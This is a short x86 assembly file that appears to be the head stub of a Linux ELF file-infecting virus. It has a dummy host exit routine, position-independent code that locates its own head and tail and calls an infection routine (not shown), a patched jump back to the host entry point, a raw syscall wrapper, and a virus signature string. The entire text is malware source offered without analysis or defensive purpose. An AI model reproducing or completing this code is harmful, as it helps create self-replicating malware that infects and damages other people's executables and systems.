

		.section host, "ax"
exit:		pushl	$0
		movl	$1,%eax
		pushl	%eax
		int	$0x80


		.text
_start:		
		.global _start, syscall
head:		pushal

		call	1f
1:		popl	%eax
		subl	$(1b - head),%eax			# %eax head vaddr
		movl	$(tail - head),%ebx			# %ebx head size
		movl	%eax,%ecx
		addl	%ebx,%ecx				# %ecx tail vaddr
		movl	$(virus_end - head),%edx
		subl	%ebx,%edx				# %edx tail size

		pushl	%edx
		pushl	%ecx
		pushl	$(ep - head)
		pushl	%ebx
		pushl	%eax
		call	tail
		addl	$20,%esp

		popal
		
		.byte	0xb8
ep:		.int	exit
		jmp	*%eax

syscall:	popl	%ecx					# ret addr
		popl	%eax					# syscall number in %eax
		pushl	%ecx
		int	$0x80
		jnc	1f
		movl	$-1,%eax
1:		pushl	%ecx					# keep stack frame intact
		ret

		.asciz "[H2T3:f0g]"
